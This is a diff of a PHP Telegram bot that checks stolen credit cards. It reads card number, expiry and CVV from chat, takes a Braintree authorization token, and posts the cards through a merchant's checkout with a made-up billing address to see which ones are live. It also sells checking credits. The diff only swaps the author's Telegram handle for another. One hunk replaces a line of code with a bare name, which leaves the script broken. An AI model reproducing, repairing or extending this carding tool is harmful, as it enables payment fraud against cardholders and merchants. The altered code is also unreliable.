@@ -1,7 +1,7 @@
 ﻿<?php
 if(strpos($message, '!au') === 0 or strpos($message, '/au') === 0 or strpos($message, '.au') === 0){
     $keyboard = [
-    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
+    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/ANDREAYT02'],]]];
 $keyboard = json_encode($keyboard);
 checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
 $starttime = microtime(true);
@@ -105,7 +105,7 @@ mysqli_close($link);
     reply_to($chatId,$message_id,$keyboard,$antispam);
     exit();
     }
-$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANDREAYT02</code></b>");
 $respon = json_decode($sss, TRUE);
 $message_id_1 = $respon['result']['message_id'];
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -178,7 +178,7 @@ $bin = substr($cc,0,6);
     edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
     exit();
     }
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■□□□□ 20%[⬛] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■□□□□ 20%[⬛] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANDREAYT02</code></b>");
 
 
 $ch = curl_init();
@@ -211,7 +211,7 @@ $decode = base64_decode($enbearer);
 $bearer = trim(strip_tags(getstr($decode, '"authorizationFingerprint":"','",')));
 echo "bearer: $bearer <br>";
 echo "merchant: $merchant <br>";
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANDREAYT02</code></b>");
 #------[CURL-2]------#
 
 $ch = curl_init();
@@ -260,8 +260,7 @@ $lookup = curl_exec($ch);
 $status = trim(strip_tags(getstr($lookup, '"status":"','"')));
 $enrolled = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"enrolled":"','"')))));
 $nonce = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"nonce":"','"')))));
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■□ 80%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
-
+ANDREAYT02
 #---------------------------------------------------------------[RESPONSES]-------------------------------------------------------#
 
 // if(!strpos($lookup, "authenticate_attempt_successful") or !strpos($lookup, 'lookup_not_enrolled') or $status != 'N'){
@@ -289,7 +288,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"6ZUZTNKJOLs0LRuSnwDsI0ebkpqNoAJH","billingAddress":{"countryId":"DE","regionId":"90","regionCode":"SL","region":"Saarland","street":["3 allen street"],"company":"","telephone":"","postcode":"10002","city":"New York","firstname":"'.$first.'","lastname":"'.$last.'","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$nonce.'","device_data":"{\"device_session_id\":\"7f3fbde1cd27a1cceb1934d42e417ab7\",\"fraud_merchant_id\":null,\"correlation_id\":\"5af64d5f57178e2603851bc2cd432b1e\"}","amgdpr_agreement":"{\"privacy_checkbox\":true}"}},"email":"'.$email.'"}');
 $result = curl_exec($ch);
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANDREAYT02</code></b>");
 
 $result2 = curl_exec($ch);
 $nonce = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($result, 'd. ','"}')))));
@@ -324,7 +323,7 @@ Bin Info ->> $bincap4-$bincap3-$bincap5
 Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
 Time ->> {$mytime($starttime)}s
 Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
-Bot By --> <code>@r0ld3x</code></b>");
+Bot By --> <code>@ANDREAYT02</code></b>");
 edit_message($chatId,$message_id_1,$keyboard, $result);
     $timest = time();
 
@@ -358,7 +357,7 @@ mysqli_close($link);
 $status = preg_replace('/_/', ' ', ucfirst($status));
 $result = urlencode("<b>
 GATE --> <i>BRAINTREE</i>
-CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
+CC ->> <code>$cc|$mes|$ano|$cvv|@ANDREAYT02</code>
 Result ->> $cc_code
 Message ->> $nonce
 ENROLLED ->> $enrolled || STATUS ->> $status
@@ -367,7 +366,7 @@ Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
 Time ->> {$mytime($starttime)}s
 Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
 Credit Left ->> ${balance}💰
-Bot By --> <code>@r0ld3x</code></b>");
+Bot By --> <code>@ANDREAYT02</code></b>");
 edit_message($chatId,$message_id_1,$keyboard, $result);
 rest($lista);
         $timest = time(); 
